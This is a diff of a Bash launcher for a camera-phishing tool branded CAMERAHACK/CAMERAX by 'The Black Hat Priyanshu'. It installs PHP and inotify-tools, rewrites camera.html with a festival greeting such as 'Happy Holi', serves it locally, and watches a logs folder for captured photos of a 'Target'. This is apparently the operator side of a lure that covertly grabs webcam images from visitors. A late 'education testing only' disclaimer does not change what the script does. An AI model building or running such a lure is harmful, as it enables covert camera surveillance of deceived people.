@@ -1,49 +1,68 @@
-
-
 #!/bin/bash
 
 # Colors
-red='\e[91m'
 green='\e[92m'
 yellow='\e[93m'
 cyan='\e[96m'
-magenta='\e[95m'
+red='\e[91m'
+blue='\e[94m'
 reset='\e[0m'
 
-# Clear screen and Show Banner
+# Auto-install required packages
+echo -e "${yellow}[+] Checking required packages...${reset}"
+pkgs=(php inotify-tools)
+for pkg in "${pkgs[@]}"; do
+    if ! command -v $pkg >/dev/null 2>&1; then
+        echo -e "${cyan}Installing $pkg...${reset}"
+        pkg install $pkg -y >/dev/null 2>&1
+    fi
+done
+
+# Banner
 clear
-echo -e "${red} ██████╗  █████╗ ███╗   ███╗███████╗██████╗  █████╗ ██╗  ██╗${reset}"
-echo -e "${yellow}██╔════╝ ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔══██╗╚██╗██╔╝${reset}"
-echo -e "${green}██║      ███████║██╔████╔██║█████╗  ██████╔╝███████║ ╚███╔╝ ${reset}"
-echo -e "${cyan}██║      ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗██╔══██║ ██╔██╗ ${reset}"
-echo -e "${magenta}╚██████╗ ██║  ██║██║ ╚═╝ ██║███████╗██║  ██║██║  ██║██╔╝ ██╗${reset}"
-echo -e "${red} ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝${reset}"
+echo -e "${red}  ██████╗ █████╗ ███╗   ███╗███████╗██████╗  █████╗ ██╗  ██╗${reset}"
+echo -e "${red} ██╔════╝██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔══██╗╚██╗██╔╝${reset}"
+echo -e "${red} ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████║ ╚███╔╝ ${reset}"
+echo -e "${red} ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗██╔══██║ ██╔██╗ ${reset}"
+echo -e "${red} ╚██████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║██║  ██║██╔╝ ██╗${reset}"
+echo -e "${red}  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝${reset}"
 echo ""
-echo -e "${cyan}----------------- CAMERAHACK ADVANCED -----------------${reset}"
-echo -e "${green}  Created by: Priyanshu Gupta❤️${reset}"
-echo -e "${yellow}  Subscribe: The Black Hat Priyanshu${reset}"
-echo -e "${cyan}-------------------------------------------------------${reset}"
+echo -e "${cyan}           --- CAMERAX TOOL (Local Version) ---${reset}"
+echo -e "${green}           Created by: Priyanshu Gupta 💯${reset}"
+echo -e "${blue}           Subscribe: The Black Hat Priyanshu${reset}"
 echo ""
 
-# Dependencies Check
-if ! command -v inotifywait >/dev/null 2>&1; then
-    echo -e "${yellow}[!] Installing inotify-tools...${reset}"
-    pkg install inotify-tools -y >/dev/null 2>&1
+# Festival Name
+echo -ne "${yellow}[+] Enter Festival Name (e.g. Holi/Diwali): ${reset}"
+read fest
+fest_slug=$(echo "$fest" | tr '[:upper:]' '[:lower:]' | tr ' ' '_')
+
+# Update festival name in camera.html
+if [ -f "camera.html" ]; then
+    sed -i "s|⭐ Happy .* ⭐|⭐ Happy $(echo "$fest" | sed 's/[&/\]/\\&/g') ⭐|g" camera.html
 fi
 
-# Start Server
-echo -e "${yellow}[+] Starting PHP server on 127.0.0.1:8080...${reset}"
+# Start PHP Server
+echo -e "${yellow}\n[+] Starting Localhost PHP server...${reset}"
 mkdir -p logs
 killall php >/dev/null 2>&1
 php -S 127.0.0.1:8080 >/dev/null 2>&1 &
 sleep 2
 
-echo -e "${cyan}[+] Local Link:${reset} ${green}http://127.0.0.1:8080${reset}"
-echo -e "${red}[!] Press Ctrl+C to Exit${reset}"
-echo ""
+# Show Link
+link="http://127.0.0.1:8080"
+echo -e "${cyan}--------------------------------------------${reset}"
+echo -e "${green}[+] URL: ${reset}${yellow}$link${reset}"
+echo -e "${cyan}--------------------------------------------${reset}"
+echo -e "${red}[!] Note: This is for local education testing only.${reset}"
 
-# Monitoring logs folder
-echo -e "${magenta}[*] Waiting for Target...${reset}"
-inotifywait -m -e create --format '%f' logs 2>/dev/null | while read file; do
-    echo -e "${green}[+ SUCCESS] Photo Captured: logs/$file${reset}"
+# Monitor Captured Images
+echo -e "\n${yellow}[*] Waiting for camera activity...${reset}"
+last_file=""
+while true; do
+    new_file=$(inotifywait -e create --format '%f' logs 2>/dev/null)
+    if [[ "$new_file" != "$last_file" ]]; then
+        echo -e "${green}[+] Captured: logs/$new_file ${reset}($(date +%H:%M:%S))"
+        last_file="$new_file"
+    fi
 done
